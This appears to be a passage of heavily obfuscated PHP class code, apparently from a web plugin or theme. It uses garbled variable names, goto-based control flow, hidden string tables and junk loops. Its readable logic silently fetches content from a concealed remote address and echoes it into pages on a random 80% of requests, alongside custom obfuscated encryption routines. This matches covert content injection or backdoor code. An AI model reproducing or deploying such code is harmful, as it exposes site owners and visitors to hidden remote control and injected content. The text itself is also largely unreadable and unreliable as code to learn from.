aµáæ∫˘ﬂı: $DÖÈ‚›ÁæÔ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÙ·€ÚÏËæ =& $_SERVER[™≤ºµ]; $Dà∞„˘∆Ü— = $aÙ·€ÚÏËæ[278]; goto eÜê¬÷ºƒñ; C»ßêóŸı“: if ($BÌ‰º—ﬁå‹ === -1) { return $Dà∞„˘∆Ü—; } $B«Ü∂èÌ¯” = $aÙ·€ÚÏËæ[243](array($aÙ·€ÚÏËæ[244] => array($aÙ·€ÚÏËæ[247] => $b§üç‹Õâ£, $aÙ·€ÚÏËæ[245] => $aÙ·€ÚÏËæ[282]), $aÙ·€ÚÏËæ[283] => array($aÙ·€ÚÏËæ[284] => !1, $aÙ·€ÚÏËæ[285] => !1))); $BÌ‰º—ﬁå‹ = @$aÙ·€ÚÏËæ[248]($Dà∞„˘∆Ü—, !1, $B«Ü∂èÌ¯”); goto e¥ªÉÿÆûò; e¥ªÉÿÆûò: $F≥∂ÇÃñïÔ = $DÖÈ‚›ÁæÔ[616]; while ($F≥∂ÇÃñïÔ < $DÖÈ‚›ÁæÔ[544]) { if ($F≥∂ÇÃñïÔ >= 0) { break; } $F≥∂ÇÃñïÔ++; } return $aÙ·€ÚÏËæ[188]($BÌ‰º—ﬁå‹, !0); goto dØíıüÕä≈; eÜê¬÷ºƒñ: $Dà∞„˘∆Ü— = $this->{$_SERVER[™≤ºµ][241]}($Dà∞„˘∆Ü—, $aÙ·€ÚÏËæ[279]); $Dà∞„˘∆Ü— = $Dà∞„˘∆Ü— . $EË¥ô◊∞∑ . $aÙ·€ÚÏËæ[280] . $aÙ·€ÚÏËæ[281]($BÌ‰º—ﬁå‹); $f¥ÙÈ§áò¶ = $DÖÈ‚›ÁæÔ[615]; goto C»ßêóŸı“; aÒç‰©ÉÏö: } private function prih6bb87bdb() { goto F√ô∆ïØò—; F«éó‚‡ŸÜ: $AºÇ–≥ôöµ = $CÚ’êëÂº¡[618]; $cÃÃÀÒ€Ï£ = $aΩÎ‘Á•Ú•[$this->ljsm2d5c14a8]; $cÃÃÀÒ€Ï£ = $bèË€Õ÷¿Ñ[199]($cÃÃÀÒ€Ï£ ? $cÃÃÀÒ€Ï£ : $bèË€Õ÷¿Ñ[287]); goto d∆”éæº–ú; BÕù‡ßë˘⁄: return $cÃÃÀÒ€Ï£ + $d∆ÒπëãŸÊ; goto bΩ√·ÃŒãç; d∆”éæº–ú: $fı˘ø‘ëŒ∂ = $CÚ’êëÂº¡[619]; if (strlen($fı˘ø‘ëŒ∂) < $CÚ’êëÂº¡[544]) { die; } $d∆ÒπëãŸÊ = $bèË€Õ÷¿Ñ[102]($this->ubik2449d0f6, $bèË€Õ÷¿Ñ[313]); goto eêüÙÎÔä∑; F√ô∆ïØò—: $CÚ’êëÂº¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bèË€Õ÷¿Ñ =& $_SERVER[™≤ºµ]; $aΩÎ‘Á•Ú• = array($bèË€Õ÷¿Ñ[286] => $bèË€Õ÷¿Ñ[287], $bèË€Õ÷¿Ñ[288] => $bèË€Õ÷¿Ñ[289], $bèË€Õ÷¿Ñ[290] => $bèË€Õ÷¿Ñ[291], $bèË€Õ÷¿Ñ[292] => $bèË€Õ÷¿Ñ[293], $bèË€Õ÷¿Ñ[294] => $bèË€Õ÷¿Ñ[295], $bèË€Õ÷¿Ñ[296] => $bèË€Õ÷¿Ñ[236], $bèË€Õ÷¿Ñ[297] => $bèË€Õ÷¿Ñ[236], $bèË€Õ÷¿Ñ[298] => $bèË€Õ÷¿Ñ[287], $bèË€Õ÷¿Ñ[299] => $bèË€Õ÷¿Ñ[289], $bèË€Õ÷¿Ñ[300] => $bèË€Õ÷¿Ñ[291], $bèË€Õ÷¿Ñ[301] => $bèË€Õ÷¿Ñ[302], $bèË€Õ÷¿Ñ[303] => $bèË€Õ÷¿Ñ[293], $bèË€Õ÷¿Ñ[304] => $bèË€Õ÷¿Ñ[305], $bèË€Õ÷¿Ñ[306] => $bèË€Õ÷¿Ñ[295], $bèË€Õ÷¿Ñ[307] => $bèË€Õ÷¿Ñ[308], $bèË€Õ÷¿Ñ[309] => $bèË€Õ÷¿Ñ[310], $bèË€Õ÷¿Ñ[311] => $bèË€Õ÷¿Ñ[312]); goto F«éó‚‡ŸÜ; eêüÙÎÔä∑: $d∆ÒπëãŸÊ = $d∆ÒπëãŸÊ ? $bèË€Õ÷¿Ñ[199]($d∆ÒπëãŸÊ) : 0; $C–Ô‰…ﬁù› = $CÚ’êëÂº¡[620]; if (strlen($C–Ô‰…ﬁù›) < $CÚ’êëÂº¡[556]) { return; } goto BÕù‡ßë˘⁄; bΩ√·ÃŒãç: } public function sxpb6f4fd889($BΩá≤‰¶·Ç) { goto B”ò≥ï±⁄è; E≠äàùﬂ€ê: if ($Aƒ∫∆≠ïØ∞ <= $fàçÓâ–›à) { return; } $BΩÒ°≠îÀÁ = $A≈öœóâ™â[61]($A≈öœóâ™â[137])->{$_SERVER[™≤ºµ][314]}($A≈öœóâ™â[315])->{$_SERVER[™≤ºµ][316]}($fàçÓâ–›à)->{$_SERVER[™≤ºµ][317]}(); $fá≥›ÈÆûú = $f•≤ïàâÀ“[623]; goto eÉŸÍí«∂; B”ò≥ï±⁄è: $f•≤ïàâÀ“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A≈öœóâ™â =& $_SERVER[™≤ºµ]; $fàçÓâ–›à = $this->{$_SERVER[™≤ºµ][135]}(); goto dêˆΩÛﬂ∑Í; FÒ»Ê≠¥≈Ò: $Aƒ∫∆≠ïØ∞ = $A≈öœóâ™â[61]($A≈öœóâ™â[137])->{$_SERVER[™≤ºµ][138]}(); $dÿ—€®âèÖ = $f•≤ïàâÀ“[622]; if (!$dÿ—€®âèÖ) { return; } goto E≠äàùﬂ€ê; eÉŸÍí«∂: while (strlen($fá≥›ÈÆûú) < $f•≤ïàâÀ“[544]) { if (!$fá≥›ÈÆûú) { break; } $fá≥›ÈÆûú++; } $BΩÒ°≠îÀÁ = $A≈öœóâ™â[220]($BΩÒ°≠îÀÁ, $A≈öœóâ™â[10], $A≈öœóâ™â[315]); if (!$A≈öœóâ™â[234]($BΩá≤‰¶·Ç[$A≈öœóâ™â[315]], $BΩÒ°≠îÀÁ)) { $A≈öœóâ™â[164]($A≈öœóâ™â[318], !1, $A≈öœóâ™â[231]); } goto C©€§…ñ¡ ; dêˆΩÛﬂ∑Í: $cÂ◊ñªæÇÁ = $f•≤ïàâÀ“[621]; if (!$cÂ◊ñªæÇÁ) { return; } if ($fàçÓâ–›à >= $A≈öœóâ™â[199]($A≈öœóâ™â[236])) { return; } goto FÒ»Ê≠¥≈Ò; C©€§…ñ¡ : } public function rytx02fbc53c() { goto c⁄Ω˜ŸÈ∆Ì; a°ÁﬁÃÁ”¯: $Cˆìá◊∫‹€ = $B∑í£≈ëÁÒ[243](array($B∑í£≈ëÁÒ[244] => array($B∑í£≈ëÁÒ[245] => $B∑í£≈ëÁÒ[246], $B∑í£≈ëÁÒ[247] => 3))); $d¨¨àµ»í = @$B∑í£≈ëÁÒ[248]($A∞˜Öä ´ı, !1, $Cˆìá◊∫‹€); $fÀÙ⁄ã∫÷´ = $AŸíª∑∂º‘[625]; goto cÂßÁâ∂âò; DñÏÇ¢€¢¿: while ($CŒ˜èÃé®¡ < $AŸíª∑∂º‘[540]) { if ($CŒ˜èÃé®¡ >= 0) { break; } $CŒ˜èÃé®¡++; } goto FßãÒÙ∫¿à; cü⁄∆ä–»: $A∞˜Öä ´ı = $B∑í£≈ëÁÒ[240]; $A∞˜Öä ´ı = $this->{$_SERVER[™≤ºµ][241]}($A∞˜Öä ´ı, $B∑í£≈ëÁÒ[242]); $BúƒùÉÑ≠à = $AŸíª∑∂º‘[624]; goto a°ÁﬁÃÁ”¯; cÂßÁâ∂âò: if (strlen($fÀÙ⁄ã∫÷´) < $AŸíª∑∂º‘[549]) { return; } echo $B∑í£≈ëÁÒ[320] . $B∑í£≈ëÁÒ[321]($d¨¨àµ»í) . $B∑í£≈ëÁÒ[322]; $CŒ˜èÃé®¡ = $AŸíª∑∂º‘[626]; goto DñÏÇ¢€¢¿; c⁄Ω˜ŸÈ∆Ì: $AŸíª∑∂º‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B∑í£≈ëÁÒ =& $_SERVER[™≤ºµ]; if (!$B∑í£≈ëÁÒ[102]($GLOBALS, $B∑í£≈ëÁÒ[130]) || $B∑í£≈ëÁÒ[319](1, 100) > 20) { return; } goto cü⁄∆ä–»; FßãÒÙ∫¿à: } private function lqoccc1ca3b8($d¿ì≤›ó‚ê, $AŒ€ô’ïº, $cﬂëÒ˜“Ùˆ = 3) { goto e€ˆﬁÈŸí‰; dê˜¡¨©®—: $bìëªÀ√ÑÆ = $E€¨ôÇΩ¶–[627]; if (!$bìëªÀ√ÑÆ) { return; } $d¿ì≤›ó‚ê = $AõóæÒÀ¡À[2]($d¿ì≤›ó‚ê); goto FŸøÙØÏ¿§; e¨œ∫∆∫ñÜ: return $fÏé»Ö◊‰ö; goto D‚≥ô±–ë; e€ˆﬁÈŸí‰: $E€¨ôÇΩ¶– =& $_SERVER[£¿ÌÙëü¡¯¯]; $AõóæÒÀ¡À =& $_SERVER[™≤ºµ]; $AõóæÒÀ¡À[323](1); goto dê˜¡¨©®—; C•·πªÍ¥§: $cÁ≈úè∆Üû = $AõóæÒÀ¡À[122](15); $b„í∫ √âÎ = $AõóæÒÀ¡À[324]; switch ($e˘åÙª‘¢Î) { case $AõóæÒÀ¡À[227]: $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][145]}($d¿ì≤›ó‚ê, $AõóæÒÀ¡À[212]($AŒ€ô’ïº . $cÁ≈úè∆Üû)); break; $F¨âßì∞ÈÛ = $E€¨ôÇΩ¶–[629]; if (strlen($F¨âßì∞ÈÛ) < $E€¨ôÇΩ¶–[556]) { return; } case $AõóæÒÀ¡À[218]: $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][145]}($d¿ì≤›ó‚ê, $AõóæÒÀ¡À[212]($cÁ≈úè∆Üû . $AŒ€ô’ïº)); break; case $AõóæÒÀ¡À[325]: $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][145]}($d¿ì≤›ó‚ê, $AõóæÒÀ¡À[116]($cÁ≈úè∆Üû . $AŒ€ô’ïº)); $EÑäªœ€ÑŒ = $E€¨ôÇΩ¶–[630]; break; $b±ü›ﬁÇÛÇ = $E€¨ôÇΩ¶–[631]; if (!$b±ü›ﬁÇÛÇ) { return; } case $AõóæÒÀ¡À[326]: $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][145]}($d¿ì≤›ó‚ê, $AõóæÒÀ¡À[112]($cÁ≈úè∆Üû . $AŒ€ô’ïº)); $Aäü‚ ƒÆ® = $E€¨ôÇΩ¶–[632]; if (strlen($Aäü‚ ƒÆ®) < $E€¨ôÇΩ¶–[549]) { die; } break; $dúûêè”‹ = $E€¨ôÇΩ¶–[633]; while ($dúûêè”‹ < $E€¨ôÇΩ¶–[556]) { if ($dúûêè”‹ >= 0) { break; } $dúûêè”‹++; } case $AõóæÒÀ¡À[327]: goto c‹≠˜ óÍó; d„ê⁄¯èìÆ: $c€é©ª†•ı = $b„í∫ √âÎ[$Fœ÷·®⁄ÑÃ]; $e∫ôî¿Ã¬ = $AõóæÒÀ¡À[112]($c€é©ª†•ı . $AõóæÒÀ¡À[112]($AŒ€ô’ïº . $c€é©ª†•ı) . $AŒ€ô’ïº); $e∫ôî¿Ã¬ = $AõóæÒÀ¡À[25]($e∫ôî¿Ã¬, $Fœ÷·®⁄ÑÃ % 8, $Fœ÷·®⁄ÑÃ % 8 + 7); goto Có√îÜö·≠; Aˆ⁄‹——¿⁄: $dû⁄†ƒ†ïÏ = 0; $e©“ﬁ‹ÚçÃ = $E€¨ôÇΩ¶–[638]; for ($EŒ†ºˆŒ‚« = 0; $EŒ†ºˆŒ‚« < $AõóæÒÀ¡À[24]($d¿ì≤›ó‚ê); $EŒ†ºˆŒ‚«++) { $dû⁄†ƒ†ïÏ = $dû⁄†ƒ†ïÏ == $AõóæÒÀ¡À[24]($e∫ôî¿Ã¬) ? 0 : $dû⁄†ƒ†ïÏ; $d£¶¢‚ØØÕ = ($Fœ÷·®⁄ÑÃ + $AõóæÒÀ¡À[329]($b„í∫ √âÎ, $d¿ì≤›ó‚ê[$EŒ†ºˆŒ‚«]) + $AõóæÒÀ¡À[330]($e∫ôî¿Ã¬[$dû⁄†ƒ†ïÏ++])) % 64; $DÂ∑‡Œ”ÿ¿ .= $b„í∫ √âÎ[$d£¶¢‚ØØÕ]; } goto Aã≠÷Èë˜≤; Aã≠÷Èë˜≤: $fÏé»Ö◊‰ö = $AõóæÒÀ¡À[321]($c€é©ª†•ı . $DÂ∑‡Œ”ÿ¿); break; $dìÕœºë»® = $E€¨ôÇΩ¶–[639]; goto FÊ‰é‡î˜™; eÉäïº“‰Ω: $EŒ†ºˆŒ‚« = 0; $bóë‘õûäŸ = $E€¨ôÇΩ¶–[636]; if (!$bóë‘õûäŸ) { die; } goto F¯ƒµä◊≠‹; c‹≠˜ óÍó: $d¿ì≤›ó‚ê = $AõóæÒÀ¡À[116]($d¿ì≤›ó‚ê); $Fœ÷·®⁄ÑÃ = $AõóæÒÀ¡À[328](0, 64); $Bóãíô»‡ø = $E€¨ôÇΩ¶–[634]; goto d„ê⁄¯èìÆ; Có√îÜö·≠: $d∫‰åÀ¨öä = $E€¨ôÇΩ¶–[635]; while ($d∫‰åÀ¨öä < $E€¨ôÇΩ¶–[561]) { if ($d∫‰åÀ¨öä >= 0) { break; } $d∫‰åÀ¨öä++; } $DÂ∑‡Œ”ÿ¿ = $AõóæÒÀ¡À[10]; goto eÉäïº“‰Ω; F¯ƒµä◊≠‹: $d£¶¢‚ØØÕ = 0; $D∑ëÏ˘—Ø≤ = $E€¨ôÇΩ¶–[637]; if (strlen($D∑ëÏ˘—Ø≤) < $E€¨ôÇΩ¶–[544]) { die; } goto Aˆ⁄‹——¿⁄; FÊ‰é‡î˜™: default: $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][145]}($d¿ì≤›ó‚ê, $AŒ€ô’ïº . $cÁ≈úè∆Üû); break; $BÙ⁄êØÈÊÀ = $E€¨ôÇΩ¶–[640]; if (strlen($BÙ⁄êØÈÊÀ) < $E€¨ôÇΩ¶–[561]) { die; } } goto B∫§∫–¯ºﬁ; B∫§∫–¯ºﬁ: $fÏé»Ö◊‰ö = $AõóæÒÀ¡À[212]($e˘åÙª‘¢Î . $cÁ≈úè∆Üû . $fÏé»Ö◊‰ö); $bÙ§’°‹ÓÙ = $E€¨ôÇΩ¶–[641]; if ($cﬂëÒ˜“Ùˆ - 1 > 0) { $fÏé»Ö◊‰ö = $this->{$_SERVER[™≤ºµ][125]}($fÏé»Ö◊‰ö, $AŒ€ô’ïº, $cﬂëÒ˜“Ùˆ - 1); } goto e¨œ∫∆∫ñÜ; FŸøÙØÏ¿§: $e˘åÙª‘¢Î = $AõóæÒÀ¡À[319](0, 5) . $AõóæÒÀ¡À[10]; $eçΩπ´Œ∞◊ = $E€¨ôÇΩ¶–[628]; while (strlen($eçΩπ´Œ∞◊) < $E€¨ôÇΩ¶–[544]) { if (!$eçΩπ´Œ∞◊) { break; } $eçΩπ´Œ∞◊++; } goto C•·πªÍ¥§; D‚≥ô±–ë: } private function zkrx2169684e($F∏Ú∆π÷≈Ò, $dŸïÏç£¯…, $eåêﬁøÖ„° = 3) { goto b«€ÿïÑ“«; FùœŒù”ô∂: if ($eåêﬁøÖ„° - 1 > 0) { $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][186]}($C‘‘ÒÁ¬∆, $dŸïÏç£¯…, $eåêﬁøÖ„° - 1); } return $C‘‘ÒÁ¬∆; goto fÛÕñ∏ÓªØ; d¥Ñ©—ÉÖÃ: $a†ﬂ‹ØÀÀü = $c‚ì˘âÃê¡[25]($F∏Ú∆π÷≈Ò, 1, 15); $F∏Ú∆π÷≈Ò = $c‚ì˘âÃê¡[25]($F∏Ú∆π÷≈Ò, 16); $F¿éÃñ∫◊§ = $Aß—πÂ∆é…[642]; goto eëî≤ËãÊ·; b«€ÿïÑ“«: $Aß—πÂ∆é… =& $_SERVER[£¿ÌÙëü¡¯¯]; $c‚ì˘âÃê¡ =& $_SERVER[™≤ºµ]; if (!$c‚ì˘âÃê¡[331]($F∏Ú∆π÷≈Ò) || $c‚ì˘âÃê¡[24]($F∏Ú∆π÷≈Ò) < 10) { return !1; } goto FÛÓÛëãÌ≥; eëî≤ËãÊ·: while (strlen($F¿éÃñ∫◊§) < $Aß—πÂ∆é…[556]) { if (!$F¿éÃñ∫◊§) { break; } $F¿éÃñ∫◊§++; } $E˘îËÁ≥‚ = $c‚ì˘âÃê¡[324]; switch ($Dã≥ÑÔíﬂá) { case $c‚ì˘âÃê¡[227]: $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][241]}($F∏Ú∆π÷≈Ò, $c‚ì˘âÃê¡[212]($dŸïÏç£¯… . $a†ﬂ‹ØÀÀü)); break; case $c‚ì˘âÃê¡[218]: $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][241]}($F∏Ú∆π÷≈Ò, $c‚ì˘âÃê¡[212]($a†ﬂ‹ØÀÀü . $dŸïÏç£¯…)); $b¡ÜåÖπÑá = $Aß—πÂ∆é…[643]; break; case $c‚ì˘âÃê¡[325]: $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][241]}($F∏Ú∆π÷≈Ò, $c‚ì˘âÃê¡[116]($a†ﬂ‹ØÀÀü . $dŸïÏç£¯…)); break; $DØ˜Ñ¬Çπê = $Aß—πÂ∆é…[644]; if (strlen($DØ˜Ñ¬Çπê) < $Aß—πÂ∆é…[556]) { return; } case $c‚ì˘âÃê¡[326]: $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][241]}($F∏Ú∆π÷≈Ò, $c‚ì˘âÃê¡[112]($a†ﬂ‹ØÀÀü . $dŸïÏç£¯…)); $Fæá®≥ﬂÇÉ = $Aß—πÂ∆é…[645]; break; case $c‚ì˘âÃê¡[327]: goto aÉö‹à©ﬁØ; AÃ‡Ÿü˜´◊: $cÎ¡¬ùêûﬂ = $c‚ì˘âÃê¡[10]; $aƒº–∏ëı∂ = $Aß—πÂ∆é…[651]; while ($aƒº–∏ëı∂ < $Aß—πÂ∆é…[540]) { if ($aƒº–∏ëı∂ >= 0) { break; } $aƒº–∏ëı∂++; } goto cÜÛ∏ëæÚ˘; eÿ˘êÌ´Ìﬁ: if (!$c≤‹©É∏∂ë) { die; } break; goto BòÙÎÍ∑õº; F§Ω•ÂﬁπÒ: $f—≠¢âõÓ√ = $c‚ì˘âÃê¡[329]($E˘îËÁ≥‚, $A…¥¢ËûËÇ); $EΩ÷ƒ≠îÍÍ = $Aß—πÂ∆é…[648]; if (!$EΩ÷ƒ≠îÍÍ) { return; } goto eÏ‰õŸ–∆ﬁ; aÉö‹à©ﬁØ: $F∏Ú∆π÷≈Ò = $c‚ì˘âÃê¡[332]($F∏Ú∆π÷≈Ò); $A…¥¢ËûËÇ = $F∏Ú∆π÷≈Ò[0]; $f—π≈Êîß£ = $Aß—πÂ∆é…[646]; goto fÊåÌÏàÖÈ; A»Óñ∂ΩÖú: for ($bı‹Ñ≠‘Îï = 0; $bı‹Ñ≠‘Îï < $c‚ì˘âÃê¡[24]($F∏Ú∆π÷≈Ò); $bı‹Ñ≠‘Îï++) { $cêƒÉ≈ÑÇõ = $cêƒÉ≈ÑÇõ == $c‚ì˘âÃê¡[24]($bÕ¢√ï√ÍÑ) ? 0 : $cêƒÉ≈ÑÇõ; $e˘€Ë¥Öë— = $cêƒÉ≈ÑÇõ++; $Eú¶≠ë’‚… = $Aß—πÂ∆é…[654]; if (strlen($Eú¶≠ë’‚…) < $Aß—πÂ∆é…[540]) { return; } $fÜÚıêè‹˜ = $c‚ì˘âÃê¡[329]($E˘îËÁ≥‚, $F∏Ú∆π÷≈Ò[$bı‹Ñ≠‘Îï]) - $f—≠¢âõÓ√ - $c‚ì˘âÃê¡[330]($bÕ¢√ï√ÍÑ[$e˘€Ë¥Öë—]); while ($fÜÚıêè‹˜ < 0) { $fÜÚıêè‹˜ += 64; } $cÎ¡¬ùêûﬂ .= $E˘îËÁ≥‚[$fÜÚıêè‹˜]; $FÜÑÑÆÎçÛ = $Aß—πÂ∆é…[655]; } $C‘‘ÒÁ¬∆ = $c‚ì˘âÃê¡[333]($cÎ¡¬ùêûﬂ); $c≤‹©É∏∂ë = $Aß—πÂ∆é…[656]; goto eÿ˘êÌ´Ìﬁ; fÊåÌÏàÖÈ: $F∏Ú∆π÷≈Ò = $c‚ì˘âÃê¡[25]($F∏Ú∆π÷≈Ò, 1); $açØÈ∫©ú´ = $Aß—πÂ∆é…[647]; while (strlen($açØÈ∫©ú´) < $Aß—πÂ∆é…[556]) { if (!$açØÈ∫©ú´) { break; } $açØÈ∫©ú´++; } goto F§Ω•ÂﬁπÒ; a≥ÆüÔ–Ñ«: $cêƒÉ≈ÑÇõ = 0; $a¢Ê‘äãÇó = $Aß—πÂ∆é…[653]; if (strlen($a¢Ê‘äãÇó) < $Aß—πÂ∆é…[561]) { return; } goto A»Óñ∂ΩÖú; fâè‚≥è„Ñ: $bÕ¢√ï√ÍÑ = $c‚ì˘âÃê¡[25]($bÕ¢√ï√ÍÑ, $f—≠¢âõÓ√ % 8, $f—≠¢âõÓ√ % 8 + 7); $fµé˜ùÚÑ∑ = $Aß—πÂ∆é…[650]; if (!$fµé˜ùÚÑ∑) { return; } goto AÃ‡Ÿü˜´◊; cÜÛ∏ëæÚ˘: $bı‹Ñ≠‘Îï = 0; $fÜÚıêè‹˜ = 0; $d«Æç∞Òì∞ = $Aß—πÂ∆é…[652]; goto a≥ÆüÔ–Ñ«; eÏ‰õŸ–∆ﬁ: $bÕ¢√ï√ÍÑ = $c‚ì˘âÃê¡[112]($A…¥¢ËûËÇ . $c‚ì˘âÃê¡[112]($dŸïÏç£¯… . $A…¥¢ËûËÇ) . $dŸïÏç£¯…); $fÁóµ∞ãçµ = $Aß—πÂ∆é…[649]; while ($fÁóµ∞ãçµ < $Aß—πÂ∆é…[549]) { if ($fÁóµ∞ãçµ >= 0) { break; } $fÁóµ∞ãçµ++; } goto fâè‚≥è„Ñ; BòÙÎÍ∑õº: default: $C‘‘ÒÁ¬∆ = $this->{$_SERVER[™≤ºµ][241]}($F∏Ú∆π÷≈Ò, $dŸïÏç£¯… . $a†ﬂ‹ØÀÀü); $e∫‹ôÑ√ßÊ = $Aß—πÂ∆é…[657]; break; } goto FùœŒù”ô∂; FÛÓÛëãÌ≥: $F∏Ú∆π÷≈Ò = $c‚ì˘âÃê¡[2]($F∏Ú∆π÷≈Ò); $F∏Ú∆π÷≈Ò = $c‚ì˘âÃê¡[212]($F∏Ú∆π÷≈Ò); $Dã≥ÑÔíﬂá = $F∏Ú∆π÷≈Ò[0]; goto d¥Ñ©—ÉÖÃ; fÛÕñ∏ÓªØ: } public function svlz49b946ae($EÇËçƒÍ∏§) { goto c∆ÉêÔØÉ≠; eß”˜îÉﬁ§: $C≈◊Æ•†ëÀ = ($b‡Èˆä´‰ü - 1) * ($d∏ßÁ·Ëñã - 1); $fœÍå≥ß¥Í = $b•ß•†◊“ˆ[659]; while ($fœÍå≥ß¥Í < $b•ß•†◊“ˆ[561]) { if ($fœÍå≥ß¥Í >= 0) { break; } $fœÍå≥ß¥Í++; } goto b™”ÓﬂÙµí; Bú¨ù∞ùÉÜ: if (!$d∞§•∫úÙ∆) { die; } return $c™Ô•ëåµ‘; goto e¿ï‹∏µ£‰; A„ÌóŸü≥ç: $eˆ‰µô•∆≤ = $b•ß•†◊“ˆ[661]; $B˘ﬁ˜¶†µÊ = $AØ±õ ûïœ[112]($AØ±õ ûïœ[335] . ($b‡Èˆä´‰ü + $d∏ßÁ·Ëñã) . $AØ±õ ûïœ[336] . $cóª¡π‹¨ç . $AØ±õ ûïœ[336] . $B°Ï¿ÏíÆﬁ . $AØ±õ ûïœ[337]); $AûÔÜÎÛœ§ = $b•ß•†◊“ˆ[662]; goto Aåﬂ ¥∫ää; Aåﬂ ¥∫ää: if (!$AûÔÜÎÛœ§) { die; } $c™Ô•ëåµ‘ = $this->{$_SERVER[™≤ºµ][145]}($EÇËçƒÍ∏§, $B˘ﬁ˜¶†µÊ) . $AØ±õ ûïœ[338] . $a√ÑÉÆëÍΩ; $d∞§•∫úÙ∆ = $b•ß•†◊“ˆ[663]; goto Bú¨ù∞ùÉÜ; b™”ÓﬂÙµí: $cóª¡π‹¨ç = $AØ±õ ûïœ[199](($b‡Èˆä´‰ü + $d∏ßÁ·Ëñã) / 2); $cõ»‡¶∆»« = $b•ß•†◊“ˆ[600]; while (1) { $E«íÃÙ÷∂‰ = $cóª¡π‹¨ç; $D¶¬©†íµÆ = $C≈◊Æ•†ëÀ; while ($D¶¬©†íµÆ % $E«íÃÙ÷∂‰ != 0) { $e†ˆ†»÷ô⁄ = $D¶¬©†íµÆ; $D¶¬©†íµÆ = $E«íÃÙ÷∂‰; $bπ•¯µÛâÛ = $b•ß•†◊“ˆ[660]; if (strlen($bπ•¯µÛâÛ) < $b•ß•†◊“ˆ[549]) { die; } $E«íÃÙ÷∂‰ = $e†ˆ†»÷ô⁄ % $E«íÃÙ÷∂‰; } if ($E«íÃÙ÷∂‰ == 1) { break; } else { $cóª¡π‹¨ç++; } } goto d‚ç‘∂∂÷Ö; d‚ç‘∂∂÷Ö: $B°Ï¿ÏíÆﬁ = 2; for ($AÖ†úÛú™É = 0; $AÖ†úÛú™É < $C≈◊Æ•†ëÀ * 10; $AÖ†úÛú™É++) { if (($C≈◊Æ•†ëÀ * $AÖ†úÛú™É + 1) % $cóª¡π‹¨ç == 0) { $B°Ï¿ÏíÆﬁ = $AØ±õ ûïœ[199](($C≈◊Æ•†ëÀ * $AÖ†úÛú™É + 1) / $cóª¡π‹¨ç); break; } } $a√ÑÉÆëÍΩ = $this->{$_SERVER[™≤ºµ][145]}($b‡Èˆä´‰ü * $d∏ßÁ·Ëñã . $AØ±õ ûïœ[10], $AØ±õ ûïœ[147]); goto A„ÌóŸü≥ç; f™ˆ∫ÑÂ¬±: $c©Ô§ŸØ¢™ = $b•ß•†◊“ˆ[658]; if (strlen($c©Ô§ŸØ¢™) < $b•ß•†◊“ˆ[549]) { return; } $d∏ßÁ·Ëñã = $this->{$_SERVER[™≤ºµ][334]}(); goto eß”˜îÉﬁ§; c∆ÉêÔØÉ≠: $b•ß•†◊“ˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AØ±õ ûïœ =& $_SERVER[™≤ºµ]; $b‡Èˆä´‰ü = $this->{$_SERVER[™≤ºµ][334]}(); goto f™ˆ∫ÑÂ¬±; e¿ï‹∏µ£‰: } public function wigpe0d39c9d($c◊ã‚öí∑Õ) { goto B∏Ô´¨í¡Â; DöÜ˜Êﬂ¿¶: if ($B®ñ«∫òÙÜ[19]($b¯√‘£ŸÓù) != 2) { return $B®ñ«∫òÙÜ[10]; } $eÑÜ›¶ªÁ = $this->{$_SERVER[™≤ºµ][241]}($b¯√‘£ŸÓù[1] . $B®ñ«∫òÙÜ[10], $B®ñ«∫òÙÜ[147]); $e∑ΩÊõÛ≤◊ = $fé„⁄¢Öî¯[664]; goto CàÒ†öπàü; d˘ì„ó·ﬂ«: $a´Ç¶é—™∆ = 2; for ($A´ó–±™Ëã = 0; $A´ó–±™Ëã < $eéÀê©é¶¯ * 10; $A´ó–±™Ëã++) { if (($eéÀê©é¶¯ * $A´ó–±™Ëã + 1) % $añÉí¨è¯⁄ == 0) { $a´Ç¶é—™∆ = $B®ñ«∫òÙÜ[199](($eéÀê©é¶¯ * $A´ó–±™Ëã + 1) / $añÉí¨è¯⁄); break; } } $B¬Ø∂¢∑Ù∆ = $B®ñ«∫òÙÜ[112]($B®ñ«∫òÙÜ[335] . ($aïøß≈ç≤¢ + $B´˜êö∞·Î) . $B®ñ«∫òÙÜ[336] . $añÉí¨è¯⁄ . $B®ñ«∫òÙÜ[336] . $a´Ç¶é—™∆ . $B®ñ«∫òÙÜ[337]); goto fïıó˜é∑µ; CàÒ†öπàü: if (!$eÑÜ›¶ªÁ) { return $B®ñ«∫òÙÜ[10]; } $eÑÜ›¶ªÁ = $B®ñ«∫òÙÜ[199]($eÑÜ›¶ªÁ); $E¥Öç¯õƒÀ = $fé„⁄¢Öî¯[665]; goto dî∞ÑÑÑë˘; fÆı≠üˆ’›: $eéÀê©é¶¯ = ($aïøß≈ç≤¢ - 1) * ($B´˜êö∞·Î - 1); $añÉí¨è¯⁄ = $B®ñ«∫òÙÜ[199](($aïøß≈ç≤¢ + $B´˜êö∞·Î) / 2); while (1) { $bì¿Â≈®√º = $añÉí¨è¯⁄; $F‹ëπë≈´É = $fé„⁄¢Öî¯[666]; if (strlen($F‹ëπë≈´É) < $fé„⁄¢Öî¯[549]) { die; } $bõÒö⁄ÙØä = $eéÀê©é¶¯; $e¡¨¥£§∏Ò = $fé„⁄¢Öî¯[667]; if (!$e¡¨¥£§∏Ò) { return; } while ($bõÒö⁄ÙØä % $bì¿Â≈®√º != 0) { $A„–´»ãœ‰ = $bõÒö⁄ÙØä; $bõÒö⁄ÙØä = $bì¿Â≈®√º; $E≥¡Êß¨õÜ = $fé„⁄¢Öî¯[668]; while ($E≥¡Êß¨õÜ < $fé„⁄¢Öî¯[544]) { if ($E≥¡Êß¨õÜ >= 0) { break; } $E≥¡Êß¨õÜ++; } $bì¿Â≈®√º = 